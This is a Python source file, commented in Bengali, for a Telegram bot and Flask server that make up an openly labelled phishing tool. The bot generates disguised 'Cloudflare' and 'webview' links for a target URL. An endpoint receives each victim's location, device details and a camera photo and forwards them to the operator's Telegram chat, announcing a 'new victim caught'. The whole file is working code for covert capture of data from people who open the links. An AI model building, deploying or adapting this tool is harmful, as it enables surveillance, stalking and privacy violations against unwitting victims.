import os
import json
import logging
from threading import Thread
import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler
from telegram import Filters
from flask import Flask, request, render_template, jsonify

# লগিং কনফিগারেশন
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# টেলিগ্রাম এবং ফিশিং লজিকের জন্য প্রয়োজনীয় ভেরিয়েবল
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TARGET_CHAT_ID = os.environ.get("TARGET_CHAT_ID")
PORT = int(os.environ.get('PORT', 5000))

# অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা
def load_allowed_users():
    try:
        with open('user.json', 'r') as f:
            data = json.load(f)
            return set(data.get("allowed_users", []))
    except FileNotFoundError:
        logger.error("user.json ফাইলটি পাওয়া যায়নি।")
        return set()

ALLOWED_USERS = load_allowed_users()

# ইউজার আইডি যাচাই করার জন্য ডেকোরেটর
def restricted(func):
    def wrapped(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ALLOWED_USERS:
            logger.warning(f"অননুমোদিত অ্যাক্সেস: {user_id}")
            update.message.reply_text("দুঃখিত, আপনার এই বট ব্যবহারের অনুমতি নেই।")
            return
        return func(update, context, *args, **kwargs)
    return wrapped

# Flask অ্যাপ ইনস্ট্যান্স তৈরি
app = Flask(__name__)

# টেলিগ্রাম বট লজিক
@restricted
def start(update, context):
    update.message.reply_text('নমস্কার! /create কমান্ড ব্যবহার করে একটি ফিশিং লিংক তৈরি করুন।')

@restricted
def create_command(update, context):
    context.user_data['waiting_for_link'] = True
    update.message.reply_text('একটি লিংক দিন যা আপনি ফিশিং পেজে ব্যবহার করতে চান।')

@restricted
def handle_message(update, context):
    user_id = update.effective_user.id
    if context.user_data.get('waiting_for_link'):
        original_url = update.message.text
        if original_url.startswith('http'):
            base_url = "https://" + os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            cloudflare_link = f"{base_url}/cloudflare?target={original_url}&chat_id={user_id}"
            webview_link = f"{base_url}/webview?target={original_url}&chat_id={user_id}"

            message = (
                f"আপনার ফিশিং লিংকগুলো নিচে দেওয়া হলো:\n\n"
                f"🔗 **Cloudflare Link:**\n`{cloudflare_link}`\n\n"
                f"🔗 **Webview Link:**\n`{webview_link}`"
            )
            update.message.reply_text(message, parse_mode='Markdown')
            del context.user_data['waiting_for_link']
        else:
            update.message.reply_text('দুঃখিত, এটি একটি বৈধ লিংক নয়। আবার চেষ্টা করুন।')

# Flask ওয়েব সার্ভার লজিক
@app.route('/cloudflare')
def serve_cloudflare_page():
    original_url = request.args.get('target', 'about:blank')
    chat_id = request.args.get('chat_id')
    return render_template('cloudflare.ejs', original_url=original_url, chat_id=chat_id)

@app.route('/webview')
def serve_webview_page():
    original_url = request.args.get('target', 'about:blank')
    chat_id = request.args.get('chat_id')
    return render_template('webview.ejs', original_url=original_url, chat_id=chat_id)

@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        if not chat_id or int(chat_id) not in ALLOWED_USERS:
            logger.warning(f"অননুমোদিত ডেটা রিকোয়েস্ট: {chat_id}")
            return jsonify({"status": "error", "message": "Unauthorized"}), 403

        bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
        
        # লোকেশনের ডেটা পাঠানো
        location_data = data.get('location', {})
        if location_data:
            bot.send_location(chat_id=int(chat_id),
                              latitude=location_data.get('latitude'),
                              longitude=location_data.get('longitude'))
        
        # ডিভাইসের অন্যান্য তথ্য পাঠানো
        device_info = data.get('device_info', {})
        info_message = f"**নতুন শিকার ধরা পড়েছে!**\n\n"
        for key, value in device_info.items():
            info_message += f"**{key.capitalize()}:** `{value}`\n"
            
        bot.send_message(chat_id=int(chat_id), text=info_message, parse_mode='Markdown')

        # ক্যামেরার ছবি পাঠানো
        image_data = data.get('image', None)
        if image_data:
            import base64
            from io import BytesIO
            image_bytes = base64.b64decode(image_data)
            bot.send_photo(chat_id=int(chat_id), photo=BytesIO(image_bytes))

        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"ডেটা রিসিভ করতে সমস্যা: {e}")
        return jsonify({"status": "error", "message": "Internal Server Error"}), 500

# টেলিগ্রাম বট এবং Flask অ্যাপ এক সাথে চালানো
def run_telegram_bot():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("create", create_command))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    updater.start_polling()
    updater.idle()

def run_flask_app():
    app.run(host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    thread_bot = Thread(target=run_telegram_bot)
    thread_flask = Thread(target=run_flask_app)
    thread_bot.start()
    thread_flask.start()
